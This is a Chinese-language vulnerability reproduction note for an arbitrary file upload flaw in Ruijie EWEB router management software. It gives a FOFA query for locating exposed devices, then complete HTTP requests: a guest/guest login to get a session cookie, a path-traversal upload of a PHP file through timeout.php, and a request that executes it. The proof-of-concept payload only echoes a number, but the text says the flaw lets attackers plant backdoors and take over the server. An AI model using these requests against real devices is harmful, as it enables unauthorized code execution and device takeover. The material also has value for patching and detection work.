# 锐捷 EWEB路由器 timeout.php任意文件上传漏洞

# 一、漏洞简介
锐捷睿易是锐捷网络面向商务市场的子品牌。拥有便捷的网络、交换机、路由器、无线、安全、云服务六大产品线，解决方案涵盖商业零售、酒店、kt、网吧、监控与安全、物流、仓储、制造。通过该漏洞，攻击者可以任意执行服务器端的代码，编写后门，获得服务器权限，进而控制整个web服务器。

# 二、影响版本
+ 锐捷 EWEB路由器

# 三、资产测绘
+ fofa`title=”锐捷网络-EWEB网管系统"`
+ 特征

# 四、漏洞复现
获取cookie
```plain
POST /ddi/server/login.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Content-Length: 30
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

username=guest&password=guest?
```
上传

```plain
POST /system_pi/timeout.php?a=upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Content-Length: 62
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=dumk6rq561ie9udafp5eod39t7; path=/; HttpOnly; RUIJIEID=dumk6rq561ie9udafp5eod39t7
X-Requested-With: XMLHttpRequest
Connection: keep-alive
 
fileName=../tmp/html/233.php&mes=<?php echo 23149147841;?>
```
访问上传结果

```plain
GET /233.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Connection: keep-alive
Cookie: RUIJIEID=dumk6rq561ie9udafp5eod39t7
Accept-Encoding: gzip, deflate, br
```
